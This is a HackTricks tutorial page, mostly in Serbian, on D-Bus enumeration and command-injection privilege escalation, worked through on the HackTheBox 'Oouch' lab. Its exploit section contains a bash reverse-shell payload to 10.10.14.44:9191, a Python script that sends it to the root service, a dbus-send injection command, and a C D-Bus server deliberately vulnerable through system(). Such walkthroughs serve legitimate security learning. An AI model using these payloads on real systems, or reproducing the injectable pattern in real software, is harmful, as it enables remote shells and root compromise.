# D-Bus Enumeration & Command Injection Privilege Escalation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **GUI enumeration**

D-Bus se koristi kao posrednik za međuprocesnu komunikaciju (IPC) u Ubuntu desktop okruženjima. Na Ubuntu-u se posmatra istovremeno delovanje nekoliko autobusnih poruka: sistemski autobus, koji prvenstveno koriste **privilegovane usluge za izlaganje usluga relevantnih za ceo sistem**, i sesijski autobus za svakog prijavljenog korisnika, koji izlaže usluge relevantne samo za tog specifičnog korisnika. Fokus ovde je prvenstveno na sistemskom autobusu zbog njegove povezanosti sa uslugama koje rade sa višim privilegijama (npr. root), jer je naš cilj da povećamo privilegije. Primećeno je da arhitektura D-Bus-a koristi 'usmerivač' po sesijskom autobusu, koji je odgovoran za preusmeravanje poruka klijenata na odgovarajuće usluge na osnovu adrese koju klijenti specificiraju za uslugu sa kojom žele da komuniciraju.

Usluge na D-Bus-u definišu **objekti** i **interfejsi** koje izlažu. Objekti se mogu uporediti sa instancama klasa u standardnim OOP jezicima, pri čemu je svaka instanca jedinstveno identifikovana **putanjom objekta**. Ova putanja, slična putanji u datotečnom sistemu, jedinstveno identifikuje svaki objekat koji usluga izlaže. Ključni interfejs za istraživačke svrhe je **org.freedesktop.DBus.Introspectable** interfejs, koji sadrži jedinstvenu metodu, Introspect. Ova metoda vraća XML reprezentaciju podržanih metoda, signala i svojstava objekta, pri čemu se ovde fokusiramo na metode dok se svojstva i signali izostavljaju.

Za komunikaciju sa D-Bus interfejsom korišćena su dva alata: CLI alat nazvan **gdbus** za jednostavno pozivanje metoda koje D-Bus izlaže u skriptama, i [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), GUI alat zasnovan na Python-u, dizajniran za enumeraciju usluga dostupnih na svakom autobusu i za prikaz objekata sadržanih unutar svake usluge.
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)


Na prvoj slici prikazane su usluge registrovane sa D-Bus sistemskom magistralom, sa **org.debin.apt** posebno istaknutom nakon odabira dugmeta System Bus. D-Feet upitkuje ovu uslugu za objekte, prikazujući interfejse, metode, svojstva i signale za odabrane objekte, što se vidi na drugoj slici. Takođe su detaljno opisani potpisi svake metode.

Značajna karakteristika je prikaz **ID procesa (pid)** i **komandne linije** usluge, što je korisno za potvrđivanje da li usluga radi sa povišenim privilegijama, što je važno za relevantnost istraživanja.

**D-Feet takođe omogućava pozivanje metoda**: korisnici mogu uneti Python izraze kao parametre, koje D-Feet konvertuje u D-Bus tipove pre nego što ih prosledi usluzi.

Međutim, imajte na umu da **neke metode zahtevaju autentifikaciju** pre nego što nam dozvole da ih pozovemo. Ignorisaćemo ove metode, pošto je naš cilj da povećamo svoje privilegije bez kredencijala u prvom redu.

Takođe imajte na umu da neke od usluga upitkuju drugu D-Bus uslugu pod imenom org.freedeskto.PolicyKit1 da li korisniku treba dozvoliti da izvrši određene radnje ili ne.

## **Cmd line Enumeration**

### Lista objekata usluga

Moguće je nabrojati otvorene D-Bus interfejse sa:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Connections

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Kada proces uspostavi vezu sa autobusom, autobus dodeljuje toj vezi poseban naziv autobusa koji se zove _jedinstveni naziv veze_. Nazivi autobusa ovog tipa su nepromenljivi—garantovano je da se neće promeniti sve dok veza postoji—i, što je još važnije, ne mogu se ponovo koristiti tokom životnog veka autobusa. To znači da nijedna druga veza sa tim autobusom nikada neće imati dodeljen takav jedinstveni naziv veze, čak i ako isti proces zatvori vezu sa autobusom i kreira novu. Jedinstveni nazivi veza su lako prepoznatljivi jer počinju sa—inače zabranjenim—dvotačkom.

### Service Object Info

Zatim, možete dobiti neke informacije o interfejsu sa:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### List Interfaces of a Service Object

Morate imati dovoljno dozvola.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspect Interface of a Service Object

Napomena kako je u ovom primeru izabran najnoviji interfejs otkriven korišćenjem `tree` parametra (_vidi prethodni odeljak_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Napomena o metodi `.Block` interfejsa `htb.oouch.Block` (onome koji nas zanima). "s" u drugim kolonama može značiti da očekuje string.

### Monitor/Interfejs za hvatanje

Sa dovoljno privilegija (samo `send_destination` i `receive_sender` privilegije nisu dovoljne) možete **monitorisati D-Bus komunikaciju**.

Da biste **monitorisali** **komunikaciju** potrebno je da budete **root.** Ako i dalje imate problema kao root, proverite [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) i [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

{% hint style="warning" %}
Ako znate kako da konfigurišete D-Bus konfiguracioni fajl da **omogući korisnicima koji nisu root da prisluškuju** komunikaciju, molim vas **kontaktirajte me**!
{% endhint %}

Različiti načini za monitorisanje:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
U sledećem primeru, interfejs `htb.oouch.Block` se prati i **poruka "**_**lalalalal**_**" se šalje kroz nesporazum**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Možete koristiti `capture` umesto `monitor` da sačuvate rezultate u pcap datoteci.

#### Filtriranje svih šumova <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Ako ima previše informacija na autobusu, prosledite pravilo za podudaranje ovako:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Više pravila može biti navedeno. Ako poruka odgovara _bilo kojem_ od pravila, poruka će biti odštampana. Kao ovo:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Pogledajte [D-Bus dokumentaciju](http://dbus.freedesktop.org/doc/dbus-specification.html) za više informacija o sintaksi pravila podudaranja.

### Više

`busctl` ima još više opcija, [**pronađite sve ovde**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Ranjavajući Scenario**

Kao korisnik **qtc unutar hosta "oouch" iz HTB** možete pronaći **neočekivanu D-Bus konfiguracionu datoteku** smeštenu u _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Napomena iz prethodne konfiguracije da **ćete morati biti korisnik `root` ili `www-data` da biste slali i primali informacije** putem ove D-BUS komunikacije.

Kao korisnik **qtc** unutar docker kontejnera **aeb4525789d8** možete pronaći neki dbus povezani kod u datoteci _/code/oouch/routes.py._ Ovo je zanimljiv kod:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Kao što možete videti, **povezuje se na D-Bus interfejs** i šalje **"Block" funkciji** "client\_ip".

Na drugoj strani D-Bus veze se izvršava neki C kompajlirani binarni program. Ovaj kod **sluša** na D-Bus vezi **za IP adresu i poziva iptables putem `system` funkcije** da blokira zadatu IP adresu.\
**Poziv `system` je namerno ranjiv na injekciju komandi**, tako da će payload poput sledećeg stvoriti reverznu ljusku: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Iskoristite to

Na kraju ove stranice možete pronaći **kompletan C kod D-Bus aplikacije**. Unutar njega možete pronaći između redova 91-97 **kako su `D-Bus objekat putanja`** **i `ime interfejsa`** **registrovani**. Ove informacije će biti neophodne za slanje informacija na D-Bus vezu:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Takođe, u liniji 57 možete pronaći da je **jedini registrovani metod** za ovu D-Bus komunikaciju nazvan `Block`(_**Zato će u sledećem odeljku biti poslati payload-ovi na servisni objekat `htb.oouch.Block`, interfejs `/htb/oouch/Block` i naziv metoda `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Sledeći python kod će poslati payload na D-Bus vezu do `Block` metode putem `block_iface.Block(runme)` (_napomena da je izvučen iz prethodnog dela koda_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl i dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send` је алат који се користи за слање порука на “Message Bus”
* Message Bus – Софтвер који системи користе за лаку комуникацију између апликација. Повезан је са Message Queue (поруке су поређане у низу), али у Message Bus поруке се шаљу у моделу претплате и такође веома брзо.
* “-system” ознака се користи да означи да је у питању системска порука, а не порука сесије (по подразумевано).
* “–print-reply” ознака се користи за правилно штампање наше поруке и примање било каквих одговора у формату који је лак за читање.
* “–dest=Dbus-Interface-Block” Адреса Dbus интерфејса.
* “–string:” – Тип поруке коју желимо да пошаљемо интерфејсу. Постоји неколико формата за слање порука као што су double, bytes, booleans, int, objpath. Од овога, “object path” је користан када желимо да пошаљемо пут до датотеке Dbus интерфејсу. У овом случају можемо користити специјалну датотеку (FIFO) да пренесемо команду интерфејсу у име датотеке. “string:;” – Ово је да поново позовемо object path где стављамо FIFO reverse shell датотеку/команду.

_Nапомена да у `htb.oouch.Block.Block`, први део (`htb.oouch.Block`) се односи на сервисни објекат, а последњи део (`.Block`) се односи на име методе._

### C code

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

## Reference
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
